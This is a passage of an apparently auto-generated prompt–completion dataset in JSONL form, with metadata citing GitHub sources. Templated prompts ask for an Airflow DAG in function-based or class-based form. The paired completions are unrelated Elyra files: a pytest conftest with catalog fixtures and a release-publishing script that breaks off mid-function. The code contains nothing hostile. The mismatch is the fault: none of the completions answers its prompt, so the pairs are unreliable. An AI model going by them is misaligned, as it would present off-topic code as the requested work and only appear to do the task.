\"*\"\n\n  # Repeat dependency updates on 2.11 branch as well\n  - package-ecosystem: pip\n    directories:\n      - /clients/python\n      - /dev/breeze\n      - /docker_tests\n      - /\n    schedule:\n      interval: daily\n    target-branch: v2-11-test\n\n  - package-ecosystem: npm\n    directories:\n      - /airflow/www/\n    schedule:\n      interval: daily\n    target-branch: v2-11-test\n    groups:\n      core-ui-package-updates:\n        patterns:\n          - \"*\"\n", "metadata": {"source": "github.com/apache/airflow", "file_path": ".github/dependabot.yml", "language": "yaml", "complexity": "simple", "star_count": 41237, "quality_score": 0.8, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate function-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\nfrom pathlib import Path\n\nimport pytest\n\nfrom elyra.metadata.metadata import Metadata\nfrom elyra.metadata.schemaspaces import ComponentCatalogs\nfrom elyra.metadata.manager import MetadataManager\nfrom elyra.pipeline.component_catalog import ComponentCache\n\npytest_plugins = [\"jupyter_server.pytest_plugin\"]\n\nTEST_CATALOG_NAME = \"new_test_catalog\"\n\nKFP_COMPONENT_CACHE_INSTANCE = {\n    \"display_name\": \"KFP Example Components\",\n    \"metadata\": {\"runtime_type\": \"KUBEFLOW_PIPELINES\", \"categories\": [\"examples\"]},\n    \"schema_name\": \"elyra-kfp-examples-catalog\",\n}\n\nAIRFLOW_TEST_OPERATOR_CATALOG = {\n    \"display_name\": \"Airflow Test Operator\",\n    \"metadata\": {\n        \"runtime_type\": \"APACHE_AIRFLOW\",\n        \"base_path\": str(Path(__file__).parent / \"elyra\" / \"tests\" / \"pipeline\" / \"resources\" / \"components\"),\n        \"paths\": [\"airflow_test_operator.py\"],\n    },\n    \"schema_name\": \"local-file-catalog\",\n}\n\n\n@pytest.fixture\ndef component_cache(jp_environ):\n    \"\"\"\n    Initialize a component cache that emulates a running server process\n    \"\"\"\n    # Create new instance and load the cache\n    component_cache = ComponentCache.instance(emulate_server_app=True)\n    component_cache.load()\n\n    yield component_cache\n    component_cache.cache_manager.stop()\n    ComponentCache.clear_instance()\n\n\n@pytest.fixture\ndef catalog_instance(component_cache, request):\n    \"\"\"Creates an instance of a component catalog and removes after test.\"\"\"\n    instance_metadata = request.param\n    instance_name = \"component_cache\"\n    md_mgr = MetadataManager(schemaspace=ComponentCatalogs.COMPONENT_CATALOGS_SCHEMASPACE_ID)\n    catalog = md_mgr.create(instance_name, Metadata(**instance_metadata))\n    component_cache.wait_for_all_cache_tasks()\n    yield catalog\n    md_mgr.remove(instance_name)\n\n\n@pytest.fixture\ndef catalog_instance_no_server_process(request):\n    \"\"\"\n    Creates an instance of a component catalog that does not emulate a server process,\n    then removes instance after test. This is used for testing CLI functionality where\n    a server process would not be present.\n    \"\"\"\n    instance_metadata = request.param\n    instance_name = \"component_cache\"\n    md_mgr = MetadataManager(schemaspace=ComponentCatalogs.COMPONENT_CATALOGS_SCHEMASPACE_ID)\n    md_mgr.create(instance_name, Metadata(**instance_metadata))\n    ComponentCache.clear_instance()  # Clear cache instance created during instance creation\n    yield\n    md_mgr.remove(instance_name)\n\n\n@pytest.fixture\ndef metadata_manager_with_teardown(jp_environ):\n    \"\"\"\n    This fixture provides a MetadataManager instance for certain tests that modify the component\n    catalog. This ensures the catalog instance is removed even when the test fails\n    \"\"\"\n    metadata_manager = MetadataManager(schemaspace=ComponentCatalogs.COMPONENT_CATALOGS_SCHEMASPACE_ID)\n\n    # Run test with provided metadata manager\n    yield metadata_manager\n\n    # Remove test catalog\n    try:\n        if metadata_manager.get(TEST_CATALOG_NAME):\n            metadata_manager.remove(TEST_CATALOG_NAME)\n    except Exception:\n        pass\n\n\n# Set Elyra server extension as enabled (overriding server_config fixture from jupyter_server)\n@pytest.fixture\ndef jp_server_config():\n    return {\"ServerApp\": {\"jpserver_extensions\": {\"elyra\": True}}}\n", "metadata": {"source": "github.com/elyra-ai/elyra", "file_path": "conftest.py", "language": "python", "complexity": "medium", "star_count": 1942, "quality_score": 0.8099999999999999, "authority_level": "high", "authentic": true}}
{"domain": "data_engineering", "category": "airflow_etl", "prompt": "### Data_Engineering Request (CLAUDE.md):\nCreate class-based implementation for Create Airflow DAG for data pipeline automation\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "#!/usr/bin/env python3\n#\n# Copyright 2018-2025 Elyra Authors\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n\n\nimport argparse\nimport elyra\nimport elyra._version\nimport git\nimport io\nimport os\nimport re\nimport shutil\nimport subprocess\nimport sys\n\nfrom datetime import datetime\nfrom pathlib import Path\nfrom types import SimpleNamespace\n\nconfig: SimpleNamespace\n\nVERSION_REG_EX = r\"(?P<major>\\d+)\\.(?P<minor>\\d+)\\.(?P<patch>\\d+)(\\.(?P<pre_release>[a-z]+)(?P<build>\\d+))?\"\n\nDEFAULT_GIT_ORG = \"elyra-ai\"\nDEFAULT_GIT_BRANCH = \"main\"\nDEFAULT_BUILD_DIR = \"build/release\"\n\n\nclass DependencyException(Exception):\n    \"\"\"Error if dependency is missing\"\"\"\n\n\nclass MissingReleaseArtifactException(Exception):\n    \"\"\"Error if an artifact being released is not available\"\"\"\n\n\nclass UpdateVersionException(Exception):\n    \"\"\"Error if the old version is invalid or cannot be found, or if there's a duplicate version\"\"\"\n\n\ndef check_run(args, cwd=os.getcwd(), capture_output=True, env=None, shell=False) -> subprocess.CompletedProcess:\n    try:\n        return subprocess.run(args, cwd=cwd, capture_output=capture_output, check=True)\n    except subprocess.CalledProcessError as ex:\n        raise RuntimeError(f'Error executing process: {ex.stderr.decode(\"unicode_escape\")}') from ex\n\n\ndef check_output(args, cwd=os.getcwd(), env=None, shell=False) -> str:\n    response = check_run(args, cwd, capture_output=True, env=env, shell=shell)\n    return response.stdout.decode(\"utf-8\").replace(\"\\n\", \"\")\n\n\ndef dependency_exists(command) -> bool:\n    \"\"\"Returns true if a command exists on the system\"\"\"\n    try:\n        check_run([\"which\", command])\n    except subprocess.CalledProcessError:\n        return False\n\n    return True\n\n\ndef sed(file: str, pattern: str, replace: str) -> None:\n    \"\"\"Perform regex substitution on a given file\"\"\"\n    try:\n        if sys.platform in [\"linux\", \"linux2\"]:\n            check_run([\"sed\", \"-i\", \"-e\", f\"s#{pattern}#{replace}#g\", file], capture_output=False)\n        elif sys.platform == \"darwin\":\n            check_run([\"sed\", \"-i\", \"\", \"-e\", f\"s#{pattern}#{replace}#g\", file], capture_output=False)\n        else:  # windows, other\n            raise RuntimeError(f\"Current operating system not supported for release publishing: {sys.platform}: \")\n    except Exception as ex:\n        raise RuntimeError(f\"Error processing updated to file {file}: \") from ex\n\n\ndef validate_dependencies() -> None:\n    \"\"\"Error if a dependency is missing or invalid\"\"\"\n    if not dependency_exists(\"git\"):\n        raise DependencyException(\"Please install git https://git-scm.com/downloads\")\n    if not dependency_exists(\"node\"):\n        raise DependencyException(\"Please install Node.js 22 https://nodejs.org/\")\n    if not dependency_exists(\"yarn\"):\n        raise DependencyException(\"Please install yarn https://classic.yarnpkg.com/\")\n    if not dependency_exists(\"twine\"):\n        raise DependencyException(\"Please install twine https://twine.readthedocs.io/en/latest/#installation\")\n\n\ndef validate_environment() -> None:\n    \"\"\"Validate environment configurations are valid\"\"\"\n    pass\n\n\ndef update_version_to_release() -> None:\n    global config\n\n    old_version = config.old_version\n    old_npm_version = config.old_npm_version\n    new_version = config.new_version\n    new_npm_version = config.new_npm_version\n\n    try:\n        # Update backend version\n        sed(_source(\".bumpversion.cfg\"), rf\"^current_version* =* {old_version}\", f\"current_version = {new_version}\")\n        sed(_source(\"elyra/_version.py\"), rf'^__version__* =* \"{old_version}\"', f'__version__ = \"{new_version}\"'),\n        sed(_source(\"README.md\"), rf\"elyra {old_version}\", f\"elyra {new_version}\")\n        sed(_source(\"docs/source/getting_started/installation.md\"), rf\"elyra {old_version}\", f\"elyra {new_version}\")\n\n        # Update docker related tags\n        sed(_source(\"Makefile\"), r\"^TAG:=dev\", f\"TAG:={new_version}\")\n        sed(_source(\"README.md\"), r\"elyra:dev \", f\"elyra:{new_version} \")\n        sed(_source(\"etc/docker/kubeflow/README.md\"), r\"kf-notebook:dev\", f\"kf-notebook:{new_version}\")\n        sed(_source(\"docs/source/getting_started/installation.md\"), r\"elyra:dev \", f\"elyra:{new_version} \")\n        sed(_source(\"docs/source/recipes/configure-airflow-as-a-runtime.md\"), r\"main\", f\"{config.tag}\")\n        sed(_source(\"docs/source/recipes/deploying-elyra-in-a-jupyterhub-environment.md\"), r\"dev\", f\"{new_version}\")\n        sed(_source(\"docs/source/recipes/using-elyra-with-kubeflow-notebook-server.md\"), r\"main\", f\"{new_version}\")\n\n        # Update UI component versions\n        sed(_source(\"README.md\"), rf\"v{old_npm_version}\", f\"v{new_version}\")\n        sed(_source(\"docs/source/getting_started/installation.md\"), rf\"v{old_npm_version}\", f\"v{new_version}\")\n\n        sed(\n            _source(\"packages/theme/src/index.ts\"),\n            r\"https://elyra.readthedocs.io/en/latest/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/\",\n        )\n\n        sed(\n            _source(\"packages/theme/src/index.ts\"),\n            r\"https://github.com/elyra-ai/elyra/releases/latest/\",\n            rf\"https://github.com/elyra-ai/elyra/releases/v{new_version}/\",\n        )\n\n        sed(\n            _source(\"packages/theme/src/index.ts\"),\n            r\"What's new in latest\",\n            rf\"What's new in v{new_version}\",\n        )\n\n        sed(\n            _source(\"elyra/cli/pipeline_app.py\"),\n            r\"https://elyra.readthedocs.io/en/latest/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/\",\n        )\n\n        # Update documentation version for elyra-metadata cli help\n        sed(\n            _source(\"elyra/metadata/metadata_app_utils.py\"),\n            r\"https://elyra.readthedocs.io/en/latest/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/\",\n        )\n\n        sed(\n            _source(\"packages/pipeline-editor/src/EmptyPipelineContent.tsx\"),\n            r\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n        )\n\n        sed(\n            _source(\"packages/pipeline-editor/src/PipelineEditorWidget.tsx\"),\n            r\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n        )\n\n        # update documentation references in schema definitions\n        # located in elyra/metadata/schemas/\n        sed(\n            _source(\"elyra/metadata/schemas/url-catalog.json\"),\n            r\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/local-directory-catalog.json\"),\n            r\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/local-file-catalog.json\"),\n            r\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/airflow.json\"),\n            r\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/kfp.json\"),\n            r\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/code-snippet.json\"),\n            r\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/runtime-image.json\"),\n            r\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n        )\n\n        # Update documentation references in documentation\n        sed(\n            _source(\"docs/source/user_guide/jupyterlab-interface.md\"),\n            r\"https://elyra.readthedocs.io/en/latest/\",\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/\",\n        )\n\n        # Update GitHub references in documentation\n        sed(\n            _source(\"docs/source/recipes/running-elyra-in-air-gapped-environment.md\"),\n            r\"elyra-ai/elyra/main/etc/kfp/pip.conf\",\n            rf\"elyra-ai/elyra/v{new_version}/etc/kfp/pip.conf\",\n        )\n        sed(\n            _source(\"docs/source/recipes/running-elyra-in-air-gapped-environment.md\"),\n            r\"elyra-ai/elyra/main/elyra/kfp/bootstrapper.py\",\n            rf\"elyra-ai/elyra/v{new_version}/elyra/kfp/bootstrapper.py\",\n        )\n        sed(\n            _source(\"docs/source/recipes/running-elyra-in-air-gapped-environment.md\"),\n            r\"elyra-ai/elyra/main/elyra/airflow/bootstrapper.py\",\n            rf\"elyra-ai/elyra/v{new_version}/elyra/airflow/bootstrapper.py\",\n        )\n        sed(\n            _source(\"docs/source/recipes/running-elyra-in-air-gapped-environment.md\"),\n            r\"elyra-ai/elyra/main/etc/generic/requirements-elyra.txt\",\n            rf\"elyra-ai/elyra/v{new_version}/etc/generic/requirements-elyra.txt\",\n        )\n\n        check_run(\n            [\"lerna\", \"version\", new_npm_version, \"--no-git-tag-version\", \"--no-push\", \"--yes\", \"--exact\"],\n            cwd=config.source_dir,\n        )\n        check_run([\"yarn\", \"version\", \"--new-version\", new_npm_version, \"--no-git-tag-version\"], cwd=config.source_dir)\n\n    except Exception as ex:\n        raise UpdateVersionException from ex\n\n\ndef update_version_to_dev() -> None:\n    global config\n\n    new_version = config.new_version\n    dev_version = config.dev_version\n    dev_npm_version = config.dev_npm_version\n\n    try:\n        # Update backend version\n        sed(_source(\".bumpversion.cfg\"), rf\"^current_version* =* {new_version}\", f\"current_version = {dev_version}\")\n        sed(_source(\"elyra/_version.py\"), rf'^__version__* =* \"{new_version}\"', f'__version__ = \"{dev_version}\"')\n        sed(_source(\"README.md\"), rf\"elyra {new_version}\", f\"elyra {dev_version}\")\n        sed(_source(\"docs/source/getting_started/installation.md\"), rf\"elyra {new_version}\", f\"elyra {dev_version}\")\n\n        # Update docker related tags\n        sed(_source(\"Makefile\"), rf\"^TAG:={new_version}\", \"TAG:=dev\")\n        sed(_source(\"README.md\"), rf\"elyra:{new_version} \", \"elyra:dev \")\n        sed(_source(\"etc/docker/kubeflow/README.md\"), rf\"kf-notebook:{new_version}\", \"kf-notebook:dev\")\n        sed(_source(\"docs/source/getting_started/installation.md\"), rf\"elyra:{new_version} \", \"elyra:dev \")\n        sed(_source(\"docs/source/recipes/configure-airflow-as-a-runtime.md\"), rf\"{config.tag}\", \"main\")\n        sed(_source(\"docs/source/recipes/deploying-elyra-in-a-jupyterhub-environment.md\"), rf\"{new_version}\", \"dev\")\n        sed(_source(\"docs/source/recipes/using-elyra-with-kubeflow-notebook-server.md\"), rf\"{new_version}\", \"main\")\n\n        # Update UI component versions\n        sed(_source(\"README.md\"), rf\"extension v{new_version}\", f\"extension v{dev_npm_version}\")\n        sed(\n            _source(\"docs/source/getting_started/installation.md\"),\n            rf\"extension v{new_version}\",\n            f\"extension v{dev_npm_version}\",\n        )\n\n        sed(\n            _source(\"packages/theme/src/index.ts\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/\",\n            rf\"https://elyra.readthedocs.io/en/latest/\",\n        )\n\n        sed(\n            _source(\"packages/theme/src/index.ts\"),\n            rf\"https://github.com/elyra-ai/elyra/releases/v{new_version}/\",\n            rf\"https://github.com/elyra-ai/elyra/releases/latest/\",\n        )\n\n        sed(\n            _source(\"packages/theme/src/index.ts\"),\n            rf\"What's new in v{new_version}\",\n            rf\"What's new in latest\",\n        )\n\n        # Update documentation references in documentation\n        sed(\n            _source(\"docs/source/user_guide/jupyterlab-interface.md\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/\",\n            r\"https://elyra.readthedocs.io/en/latest/\",\n        )\n\n        sed(\n            _source(\"elyra/cli/pipeline_app.py\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/\",\n            rf\"https://elyra.readthedocs.io/en/latest/\",\n        )\n\n        # Update documentation version for elyra-metadata cli help\n        sed(\n            _source(\"elyra/metadata/metadata_app_utils.py\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/\",\n            rf\"https://elyra.readthedocs.io/en/latest/\",\n        )\n\n        sed(\n            _source(\"packages/pipeline-editor/src/EmptyPipelineContent.tsx\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n        )\n\n        sed(\n            _source(\"packages/pipeline-editor/src/PipelineEditorWidget.tsx\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n        )\n\n        # Update GitHub references in documentation\n        sed(\n            _source(\"docs/source/recipes/running-elyra-in-air-gapped-environment.md\"),\n            rf\"elyra-ai/elyra/v{new_version}/etc/kfp/pip.conf\",\n            r\"elyra-ai/elyra/main/etc/kfp/pip.conf\",\n        )\n        sed(\n            _source(\"docs/source/recipes/running-elyra-in-air-gapped-environment.md\"),\n            rf\"elyra-ai/elyra/v{new_version}/elyra/kfp/bootstrapper.py\",\n            r\"elyra-ai/elyra/main/elyra/kfp/bootstrapper.py\",\n        )\n        sed(\n            _source(\"docs/source/recipes/running-elyra-in-air-gapped-environment.md\"),\n            rf\"elyra-ai/elyra/v{new_version}/elyra/airflow/bootstrapper.py\",\n            r\"elyra-ai/elyra/main/elyra/airflow/bootstrapper.py\",\n        )\n        sed(\n            _source(\"docs/source/recipes/running-elyra-in-air-gapped-environment.md\"),\n            rf\"elyra-ai/elyra/v{new_version}/etc/generic/requirements-elyra.txt\",\n            r\"elyra-ai/elyra/main/etc/generic/requirements-elyra.txt\",\n        )\n\n        # update documentation references in schema definitions\n        # located in elyra/metadata/schemas/\n        sed(\n            _source(\"elyra/metadata/schemas/url-catalog.json\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/local-directory-catalog.json\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/local-file-catalog.json\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/airflow.json\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/kfp.json\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/code-snippet.json\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n        )\n\n        sed(\n            _source(\"elyra/metadata/schemas/runtime-image.json\"),\n            rf\"https://elyra.readthedocs.io/en/v{new_version}/user_guide/\",\n            rf\"https://elyra.readthedocs.io/en/latest/user_guide/\",\n        )\n\n        check_run(\n            [\"lerna\", \"version\", dev_npm_version, \"--no-git-tag-version\", \"--no-push\", \"--yes\", \"--exact\"],\n            cwd=config.source_dir,\n        )\n        check_run([\"yarn\", \"version\", \"--new-version\", dev_npm_version, \"--no-git-tag-version\"], cwd=config.source_dir)\n\n    except Exception as ex:\n        raise UpdateVersionException from ex\n\n\ndef _source(file: str) -> str:\n    global config\n\n    return os.path.join(config.source_dir, file)\n\n\ndef checkout_code() -> None:\n    global config\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"-------------------- Retrieving source code ---------------------\")\n    print(\"-----------------------------------------------------------------\")\n\n    print(f\"Cloning repository: {config.git_url}\")\n    if os.path.exists(config.work_dir):\n        print(f\"Removing working directory: {config.work_dir}\")\n        shutil.rmtree(config.work_dir)\n    print(f\"Creating working directory: {config.work_dir}\")\n    os.makedirs(config.work_dir)\n    print(f\"Cloning : {config.git_url} to {config.work_dir}\")\n    check_run([\"git\", \"clone\", config.git_url, \"-b\", config.git_branch], cwd=config.work_dir)\n    check_run([\"git\", \"config\", \"user.name\", config.git_user_name], cwd=config.source_dir)\n    check_run([\"git\", \"config\", \"user.email\", config.git_user_email], cwd=config.source_dir)\n\n    print(\"\")\n\n\ndef build_release():\n    global config\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"----------------------- Building Release ------------------------\")\n    print(\"-----------------------------------------------------------------\")\n\n    # Build wheels and source packages\n    check_run([\"make\", \"release\"], cwd=config.source_dir, capture_output=False)\n\n    if not config.pre_release:\n        # Build container images from tagged release\n        check_run([\"git\", \"checkout\", f\"tags/v{config.new_version}\"], cwd=config.source_dir, capture_output=False)\n        check_run([\"make\", \"container-images\"], cwd=config.source_dir, capture_output=False)\n        check_run([\"git\", \"checkout\", \"main\"], cwd=config.source_dir, capture_output=False)\n\n    print(\"\")\n\n\ndef build_server():\n    global config\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"------------------------ Building Server ------------------------\")\n    print(\"-----------------------------------------------------------------\")\n\n    # update project name\n    sed(_source(\"pyproject.toml\"), r'name=\"elyra\"', 'name=\"elyra-server\"')\n    sed(\n        _source(\"pyproject.toml\"),\n        r'description=\"Elyra provides AI Centric extensions to JupyterLab\"',\n        'description=\"The elyra-server package provides common core libraries and functions that are required by '\n        \"Elyra's individual extensions. Note: Installing this package alone will not enable the use of Elyra. \"\n        \"Please install the 'elyra' package instead. e.g. pip install elyra[all]\\\"\",\n    )\n\n    # build server wheel\n    check_run([\"make\", \"build-server\"], cwd=config.source_dir, capture_output=False)\n\n    # revert project name\n    check_run([\"git\", \"reset\", \"--hard\"], cwd=config.source_dir, capture_output=False)\n\n    print(\"\")\n\n\ndef show_release_artifacts():\n    global config\n    dist_dir = os.path.join(config.source_dir, \"dist\")\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"------------------------ Release Files --------------------------\")\n    print(\"-----------------------------------------------------------------\")\n\n    print(\"\")\n    print(f\"Location \\t {dist_dir}\")\n    print(\"\")\n    check_run([\"ls\", \"-la\", dist_dir], capture_output=False)\n    print(\"\")\n\n\ndef copy_extension_dir(extension: str, work_dir: str) -> None:\n    global config\n\n    extension_package_source_dir = os.path.join(config.source_dir, \"build/labextensions/@elyra\", extension)\n    extension_package_dest_dir = os.path.join(work_dir, \"build/labextensions/@elyra\", extension)\n    os.makedirs(os.path.dirname(extension_package_dest_dir), exist_ok=True)\n    shutil.copytree(extension_package_source_dir, extension_package_dest_dir)\n\n\ndef generate_changelog() -> None:\n    global config\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"--------------------- Preparing Changelog -----------------------\")\n    print(\"-----------------------------------------------------------------\")\n\n    changelog_path = os.path.join(config.source_dir, \"docs/source/getting_started/changelog.md\")\n    changelog_backup_path = os.path.join(config.source_dir, \"docs/source/getting_started/changelog.bak\")\n    if os.path.exists(changelog_backup_path):\n        os.remove(changelog_backup_path)\n    shutil.copy(changelog_path, changelog_backup_path)\n\n    repo = git.Repo(config.source_dir)\n\n    # define static header\n    header_lines = [\n        \"# Changelog\\n\",\n        \"\\n\",\n        \"A summary of new feature highlights is located on the [GitHub release page](https://github.com/elyra-ai/elyra/releases).\\n\",\n        \"\\n\",\n    ]\n\n    # Start generating the release header on top of the changelog\n    with io.open(changelog_path, \"r+\") as changelog:\n        # add static header\n        for line in header_lines:\n            changelog.write(line)\n        # add release section\n        changelog.write(f'## Release {config.new_version} - {datetime.now().strftime(\"%m/%d/%Y\")}\\n')\n        changelog.write(\"\\n\")\n\n        start = 0\n        page_size = 10\n        continue_paginating = True\n        while continue_paginating:\n            # paginate the list of commits until it finds the begining of release changes\n            # which is denominated by a commit titled 'Prepare for next development iteration'\n            commits = list(repo.iter_commits(max_count=page_size, skip=start))\n            start += page_size\n            for commit in commits:\n                # for each commit, get it's title and prepare a changelog\n                # entry linking to the related pull request\n                commit_title = commit.message.splitlines()[0]\n                # commit_hash = commit.hexsha\n                # print(f'>>> {commit_hash} - {commit_title}')\n                if commit_title != \"Prepare for next development iteration\":\n                    pr_string = \"\"\n                    pr = re.findall(\"\\(#(.*?)\\)\", commit_title)\n                    if pr:\n                        commit_title = re.sub(\"\\(#(.*?)\\)\", \"\", commit_title).strip()\n                        pr_string = f\" - [#{pr[0]}](https://github.com/elyra-ai/elyra/pull/{pr[0]})\"\n                    changelog_entry = f\"- {commit_title}{pr_string}\\n\"\n                    changelog.write(changelog_entry)\n                else:\n                    # here it found the first commit of the release\n                    # changelog for the release is done\n                    # exit the loop\n                    continue_paginating = False\n                    break\n\n        # copy the remaining changelog at the bottom of the new content\n        with io.open(changelog_backup_path) as old_changelog:\n            # ignore existing static header\n            line = old_changelog.readline()\n            while line and line.startswith(\"## Release\") is False:\n                line = old_changelog.readline()\n\n            changelog.write(\"\\n\")\n\n            while line:\n                changelog.write(line)\n                line = old_changelog.readline()\n\n\ndef prepare_extensions_release() -> None:\n    global config\n\n    print(\"-----------------------------------------------------------------\")\n    print(\"--------------- Preparing Individual Extensions -----------------\")\n    print(\"-----------------------------------------------------------------\")\n\n    extensions = {\n        \"elyra-code-snippet-extension\": SimpleNamespace(\n            packages=[\"code-snippet-extension\", \"metadata-extension\", \"theme-extension\"],\n            description=f\"The Code Snippet editor extension adds support for reusable code fragments, \"\n            f\"making programming in JupyterLab more efficient by reducing repetitive work. \"\n            f\"See https://elyra.readthedocs.io/en/v{config.new_version}/user_guide/code-snippets.html\",\n        ),\n        \"elyra-pipeline-editor-extension\": SimpleNamespace(\n            packages=[\"pipeline-editor-extension\", \"metadata-extension\", \"theme-extension\"],\n            description=f\"The Visual Editor Pipeline extension is used to build AI pipelines from notebooks, \"\n            f\"Python scripts and R scripts, simplifying the conversion of multiple notebooks \"\n            f\"or script files into batch jobs or workflows.\"\n            f\"See https://elyra.readthedocs.io/en/v{config.new_version}/user_guide/pipelines.html\",\n        ),\n        \"elyra-python-editor-extension\": SimpleNamespace(\n            packages=[\"python-editor-extension\", \"metadata-extension\", \"theme-extension\", \"script-debugger-extension\"],\n            description=f\"The Python Script editor extension contains support for Python files, \"\n            f\"which can take advantage of the Hybrid Runtime Support enabling users to \"\n            f\"locally edit, execute and debug .py scripts against local or cloud-based resources.\"\n            f\"See https://elyra.readthedocs.io/en/v{config.new_version}/user_guide/enhanced-script-support.html\",\n        ),\n        \"elyra-r-editor-extension\": SimpleNamespace(\n            packages=[\"r-editor-extension\", \"metadata-extension\", \"theme-extension\", \"script-debugger-extension\"],\n            description=f\"The R Script editor extension contains support for R files, which can take \"\n            f\"advantage of the Hybrid Runtime Support enabling users to locally edit .R scripts \"\n            f\"and execute them against local or cloud-based resources.\"\n            f\"See https://elyra.readthedocs.io/en/v{config.new_version}/user_guide/enhanced-script-support.html\",\n        ),\n        \"elyra-scala-editor-extension\": SimpleNamespace(\n            packages=[\"scala-editor-extension\", \"metadata-extension\", \"theme-extension\", \"script-debugger-extension\"],\n            description=f\"The Scala Language editor extension contains support for Scala files, which can take \"\n            f\"advantage of the Hybrid Runtime Support enabling users to locally edit .scala files \"\n            f\"and execute them against local or cloud-based resources.\"\n            f\"See https://elyra.readthedocs.io/en/v{config.new_version}/user_guide/enhanced-script-support.html\",\n        ),\n    }\n\n    for extension in extensions:\n        extension_source_dir = os.path.join(config.work_dir, extension)\n        print(f\"Preparing extension : {extension} at {extension_source_dir}\")\n        # copy extension package template to working directory\n        if os.path.exists(extension_source_dir):\n            print(f\"Removing working directory: {config.source_dir}\")\n            shutil.rmtree(extension_source_dir)\n        check_run([\"mkdir\", \"-p\", extension_source_dir], cwd=config.work_dir)\n        print(f'Copying : {_source(\"etc/templates/setup.py\")} to {extension_source_dir}')\n        check_run([\"cp\", _source(\"etc/templates/setup.py\"), extension_source_dir], cwd=config.work_dir)\n        # update template\n        setup_file = os.path.join(extension_source_dir, \"setup.py\")\n        sed(setup_file, \"{{package-name}}\", extension)\n        sed(setup_file, \"{{version}}\", config.new_version)\n        sed(setup_file, \"{{data - files}}\", re.escape(\"('share/jupyter/labextensions', 'build/labextensions', '**')\"))\n        sed(setup_file, \"{{install - requires}}\", 